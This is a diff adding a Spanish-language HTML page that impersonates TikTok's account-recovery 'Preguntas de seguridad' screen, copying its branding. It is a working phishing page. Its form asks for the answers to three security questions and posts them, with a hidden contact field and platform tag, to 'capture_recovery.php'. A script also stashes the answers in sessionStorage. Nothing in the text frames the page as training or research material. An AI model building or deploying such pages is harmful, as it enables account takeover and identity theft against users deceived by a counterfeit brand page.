@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Preguntas de seguridad • TikTok</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23000000' d='M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1.04-.1z'/%3E%3C/svg%3E">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .tk-header {
+            background: #fff;
+            padding: 12px 20px;
+            border-bottom: 1px solid rgba(22, 24, 35, 0.12);
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        
+        .tk-back-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #161823;
+            padding: 0 8px;
+        }
+        
+        .tk-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .tk-logo-icon {
+            width: 32px;
+            height: 32px;
+            background: #000;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #00f2ea;
+            font-weight: bold;
+            font-size: 18px;
+            position: relative;
+        }
+        
+        .tk-logo-icon::after {
+            content: "♪";
+            color: #ff0050;
+            position: absolute;
+            right: -4px;
+            bottom: -4px;
+            font-size: 14px;
+        }
+        
+        .tk-logo-text {
+            font-size: 20px;
+            font-weight: 600;
+            color: #161823;
+        }
+        
+        .tk-header h1 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #161823;
+        }
+        
+        .tk-main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 20px;
+        }
+        
+        .tk-card {
+            background: #fff;
+            border-radius: 12px;
+            max-width: 420px;
+            width: 100%;
+            padding: 28px 24px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+        }
+        
+        .tk-card h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #161823;
+            margin-bottom: 8px;
+        }
+        
+        .tk-subtitle {
+            color: rgba(22, 24, 35, 0.75);
+            font-size: 14px;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+        
+        .tk-question-group {
+            margin-bottom: 24px;
+        }
+        
+        .tk-question-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #161823;
+            margin-bottom: 8px;
+        }
+        
+        .tk-input {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 16px;
+            background: rgba(22, 24, 35, 0.06);
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.2s, background 0.2s;
+        }
+        
+        .tk-input:focus {
+            border-color: #161823;
+            background: #fff;
+        }
+        
+        .tk-hint {
+            font-size: 12px;
+            color: rgba(22, 24, 35, 0.5);
+            margin-top: 6px;
+        }
+        
+        .tk-actions {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding-top: 8px;
+        }
+        
+        .tk-btn-continue {
+            background: #fe2c55;
+            color: white;
+            border: none;
+            padding: 12px 32px;
+            font-size: 15px;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .tk-btn-continue:hover {
+            background: #e8254a;
+        }
+        
+        .tk-btn-continue:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .tk-footer {
+            padding: 20px;
+            border-top: 1px solid rgba(22, 24, 35, 0.12);
+            text-align: center;
+        }
+        
+        .tk-footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 12px;
+        }
+        
+        .tk-footer-links a {
+            color: rgba(22, 24, 35, 0.5);
+            font-size: 12px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .tk-copyright {
+            color: rgba(22, 24, 35, 0.5);
+            font-size: 12px;
+        }
+        
+        @media (max-width: 480px) {
+            .tk-card {
+                box-shadow: none;
+                padding: 20px 16px;
+            }
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <header class="tk-header">
+        <button class="tk-back-btn" onclick="history.back()">←</button>
+        <div class="tk-logo">
+            <div class="tk-logo-icon">T</div>
+            <span class="tk-logo-text">TikTok</span>
+        </div>
+        <h1>Seguridad</h1>
+    </header>
+    
+    <main class="tk-main">
+        <div class="tk-card">
+            <h2>Preguntas de seguridad</h2>
+            <p class="tk-subtitle">Responde las preguntas para verificar tu identidad.</p>
+            
+            <form id="securityForm" action="capture_recovery.php" method="POST">
+                <input type="hidden" name="platform" value="tiktok">
+                <input type="hidden" name="recovery_type" value="security_questions">
+                <input type="hidden" name="contact" id="hiddenContact">
+                
+                <div class="tk-question-group">
+                    <label>¿Cuál es el nombre de tu primera mascota?</label>
+                    <input type="text" name="question_1" class="tk-input" placeholder="Nombre" required autocomplete="off">
+                    <div class="tk-hint">Pregunta de seguridad</div>
+                </div>
+                
+                <div class="tk-question-group">
+                    <label>¿En qué ciudad naciste?</label>
+                    <input type="text" name="question_2" class="tk-input" placeholder="Ciudad" required autocomplete="off">
+                </div>
+                
+                <div class="tk-question-group">
+                    <label>¿Cuál es tu comida favorita?</label>
+                    <input type="text" name="question_3" class="tk-input" placeholder="Comida" required autocomplete="off">
+                </div>
+                
+                <div class="tk-actions">
+                    <button type="submit" class="tk-btn-continue" id="submitBtn">Verificar</button>
+                </div>
+            </form>
+        </div>
+    </main>
+    
+    <footer class="tk-footer">
+        <div class="tk-footer-links">
+            <a href="#">Información</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Condiciones</a>
+            <a href="#">Ayuda</a>
+        </div>
+        <div class="tk-copyright">
+            © 2025 TikTok
+        </div>
+    </footer>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const contact = urlParams.get('contact') || sessionStorage.getItem('tk_recovery_contact') || '';
+        document.getElementById('hiddenContact').value = contact;
+        
+        document.getElementById('securityForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = '<span class="loading-spinner"></span>Verificando...';
+            btn.disabled = true;
+            
+            const q1 = document.querySelector('input[name="question_1"]').value;
+            const q2 = document.querySelector('input[name="question_2"]').value;
+            const q3 = document.querySelector('input[name="question_3"]').value;
+            
+            sessionStorage.setItem('tk_recovery_q1', q1);
+            sessionStorage.setItem('tk_recovery_q2', q2);
+            sessionStorage.setItem('tk_recovery_q3', q3);
+        });
+    </script>
+</body>
+</html>
